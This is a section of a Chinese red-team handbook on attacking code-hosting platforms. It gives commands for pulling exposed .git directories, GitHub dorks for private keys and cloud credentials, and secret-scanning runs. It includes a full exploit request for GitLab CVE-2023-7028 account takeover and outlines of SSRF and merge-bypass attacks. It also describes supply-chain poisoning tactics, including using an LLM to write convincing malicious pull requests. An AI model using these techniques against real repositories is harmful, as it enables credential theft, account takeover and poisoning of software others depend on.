## 二、代码托管平台攻击（GitHub/GitLab/Gitee/Bitbucket）

### 2.1 信息泄露与公开攻击面
```
# 1) .git 目录泄露（未禁止目录浏览的 Web 部署）
curl http://target/.git/config
# 用 git-dumper 完整拉取
git-dumper http://target/.git/ /tmp/repo
# 2) GitHub 代码搜索（GitHub Dorking 挖掘敏感信息）
#   site:github.com "BEGIN RSA PRIVATE KEY"
#   "aws_access_key_id" "AKIA" language:yaml
#   "password" "jdbc:" language:java org:目标公司
#   filename:.npmrc _authToken
#   filename:credentials.json OR filename:service-account.json
# 3) Git 历史泄露：旧提交常含已轮换的密钥
git log --all --oneline --grep="password\|secret\|key"
git log -p -S "password" --all
git log --all --reflog --oneline
# 4) 仓库元信息：成员列表/分支策略/Webhook 配置
# 5) 提交邮箱 → 社工/钓鱼素材
```

### 2.2 Git 对象深度利用（拿不到仓库权限也能拿数据）
```bash
# dangling commits（GC 未清理的历史提交，可能含敏感信息）
git fsck --lost-found --no-reflogs
git fsck --unreachable
git show <hash>
# reflog（HEAD 移动历史，找回"已删除"的提交）
git reflog
git reset --hard HEAD@{n}   # 恢复被删除的分支/提交
# stash（未提交的暂存改动，常含临时测试凭据）
git stash list && git stash show -p stash@{0}
# 分支/tag 枚举：预览版、hotfix、release 分支常带额外 Secret
git branch -a ; git tag -l
# fork/PR 相关：PR 分支中可能包含未合并的敏感改动
# 已删除的 tag 可通过 reflog/fsck 找回
```
> **红队要点**：拿到"已删除"的文件/提交，往往比当前代码更有价值（运维把密钥"删了"但历史里全在）。

### 2.3 Secret 挖掘（自动化）
```bash
# trufflehog（深度扫描 Git 历史全量 secret）
trufflehog git https://github.com/org/repo --only-verified
trufflehog filesystem --directory=./repo
# gitleaks（规则引擎，支持自定义）
gitleaks detect --source=./repo --report-format=json --report-path=report.json
gitleaks git --remote=https://github.com/org/repo
# gitdorker（GitHub dork 自动化）
python gitdorker.py -tf tokens.txt -q "org:目标公司 password" -d /tmp/out
# 本地仓库全量扫描
grep -rniE "(api[_-]?key|secret|token|password)\s*[=:]\s*['\"][^'\"]{8,}" .
# 配置文件高价值目标：
#   .env / .npmrc / .pypirc / settings.xml(~/.m2) / ~/.gradle/gradle.properties
#   credentials.json / service-account.json / id_rsa / known_hosts
```

### 2.4 平台配置缺陷（权限放大）
```
# Deploy Key（只读/只写差异）与 SSH 签名验证
# Webhook URL 与 Secret 泄露 → 伪造事件投毒
# 平台集成（Slack/Jira/云绑定）OAuth 凭据
# 仓库权限模型：开发者可 push 的边界、分支保护是否真正强制
# Merge Request 审批流程可绕过点（rebase/force-push/规则缺口）
# 高权限 token 泄露：PAT/Deploy Token/Runner Token
```

### 2.5 GitLab 漏洞利用（重点）
```
# CVE-2023-7028（任意用户密码重置→含管理员，CVSS 7.5）
# 影响: 16.1~16.1.5, 16.2~16.2.7, 16.3~16.3.6, 16.4~16.4.4, 16.5~16.5.5,
#       16.6~16.6.3, 16.7~16.7.1（已修复版本见官方公告）
# 根因: 密码重置接口 user[email] 支持数组，两个邮箱同时收到重置链接
# 利用: 目标邮箱 + 攻击者邮箱都收到链接 → 重置目标密码
POST /users/password HTTP/1.1
Content-Type: application/x-www-form-urlencoded
authenticity_token=<token>&user[email][]=<EMAIL-REDACTED>&user[email][]=<EMAIL-REDACTED>
# 2FA 可缓解（重置后仍需 2FA）；自动化工具: CVE-2023-7028.py
# 获得管理员后: 创建 Runner → 读取全部项目/CI变量/仓库 → 供应链投毒

# CVE-2021-22214（CI API 未授权 SSRF，CVSS 7.0）
# 未认证 POST /api/v4/ci/lint 的 include 远程拉取 → SSRF 探测内网
# 内网探测: 读云元数据 169.254.169.254 / 探内网端口 / Redis 等

# CVE-2023-2825（任意分支合并权限绕过 → RCE, CVSS 9.6）
# 通过 pipeline 派生分支将任意代码合并，配合 CI 执行 → RCE

# 常见面: Runner 未隔离（共享 runner 投毒）、CI_JOB_TOKEN 权限过大、
#         /api/v4/projects 未授权、公共项目被 fork 后投毒
# 平台识别: 响应头 X-GitLab-Event / /-/health / /api/v4/version（未认证常可读）
```

### 2.6 GitHub 特定攻击面
```
# OAuth App 劫持: 恶意 App 诱导授权 → 读取私有仓库/actions secrets
# GITHUB_TOKEN 权限过大（workflow 里用默认 token 操作仓库 → 被投毒流程利用）
# 自托管 Runner 暴露 → 任何能触发 workflow 的人都可打 Runner（见3.2）
# Actions secrets 间接泄露（通过可读日志/错误输出）
# GitHub App 安装令牌劫持（organization 级权限放大）
# 公开仓库的 workflow 可被 fork+PR 触发（pull_request_target 漏洞面）
```

### 2.7 恶意代码投递（供应链上游污染）
```
# 1) 伪装贡献者: 克隆邮箱/头像提恶意 PR，诱导维护者合入
# 2) 依赖劫持: 在合法包发布前抢注同版本号/同名称（见第四章）
# 3) 文档投毒: README/Wiki/示例代码中藏恶意命令（复制粘贴攻击）
# 4) 工具链污染: 引导开发者安装"辅助脚本/格式化工具/脚手架"
# 5) fork 投毒: 让目标团队把恶意 fork 当上游（维护者过少时高发）
# AI辅助: 用LLM生成"看起来非常专业"的恶意PR描述与代码提交（见第十一章）
```

